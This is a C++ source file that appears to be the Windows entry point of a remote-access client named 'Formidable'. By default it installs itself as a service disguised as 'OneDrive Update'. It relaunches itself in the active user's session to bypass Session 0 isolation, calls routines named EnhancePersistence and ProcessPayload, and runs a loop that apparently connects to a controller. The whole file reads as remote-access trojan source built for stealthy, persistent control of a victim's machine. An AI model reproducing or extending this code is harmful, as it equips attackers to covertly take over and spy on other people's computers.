#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <urlmon.h>
#include <string>
#include <atomic>

#include "../../Common/Config.h"
#include "../../Common/Utils.h"
#include "../../Common/ClientCore.h"
#include "Security/PersistenceOptimizer.h"
#include "Utils/Logger.h"
#include "Core/AutomationManager.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wtsapi32.lib")

using namespace Formidable;

// 服务主函数
void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
    g_IsService = true;
    
    std::wstring serviceName = L"OneDrive Update";
    std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
    if (!configInstallName.empty()) {
        serviceName = configInstallName;
        if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
            serviceName = serviceName.substr(0, serviceName.length() - 4);
        }
    }

    static std::atomic<bool> bServiceRunning(true);
    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(serviceName.c_str(), [](DWORD dwCtrl) {
        if (dwCtrl == SERVICE_CONTROL_STOP || dwCtrl == SERVICE_CONTROL_SHUTDOWN) {
            bServiceRunning = false;
        }
    });

    if (hStatus) {
        SERVICE_STATUS status = { SERVICE_WIN32_OWN_PROCESS, SERVICE_RUNNING, SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN };
        SetServiceStatus(hStatus, &status);
    }

    // 在服务中，我们尝试在当前活跃用户会话中启动一个客户端实例
    // 这样客户端就可以访问用户桌面、绕过 Session 0 隔离
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // 启动一个监控循环
    while (bServiceRunning) {
        if (IsUserSessionActive()) {
            // 尝试在用户会话启动实例
            //Mutex 已经在 WinMain 处理，所以这里启动后如果已存在会自退出
            LaunchInUserSession(szPath);
        }
        
        // 每10秒检查一次
        for (int i = 0; i < 100 && bServiceRunning; ++i) {
            Sleep(100);
        }
    }

    if (hStatus) {
        SERVICE_STATUS status = { SERVICE_WIN32_OWN_PROCESS, SERVICE_STOPPED, 0 };
        SetServiceStatus(hStatus, &status);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    InitClientCore();

    // 确保每个会话只有一个实例运行
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    std::wstring mutexName = L"Global\\FormidableClient_Session_" + std::to_wstring(sessionId);
    HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    // 检查是否作为服务启动
    std::wstring serviceName = L"OneDrive Update";
    std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
    if (!configInstallName.empty()) {
        serviceName = configInstallName;
        if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
            serviceName = serviceName.substr(0, serviceName.length() - 4);
        }
    }

    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        { (LPWSTR)serviceName.c_str(), (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcherW(ServiceTable)) {
        CleanupClientCore();
        return 0;
    }

    // 正常启动逻辑
    InstallClient();
    Formidable::Client::Security::PersistenceOptimizer::EnhancePersistence();
    ProcessPayload();
    // Formidable::Client::Utils::Logger::Init("client.log");
    Formidable::Client::Core::AutomationManager::Initialize();
    Formidable::Client::Core::AutomationManager::Start();

    std::atomic<bool> bShouldExit(false);
    std::atomic<bool> bConnected(false);

    RunClientLoop(bShouldExit, bConnected);

    Formidable::Client::Core::AutomationManager::Stop();
    Formidable::Client::Utils::Logger::Close();
    CleanupClientCore();
    return 0;
}
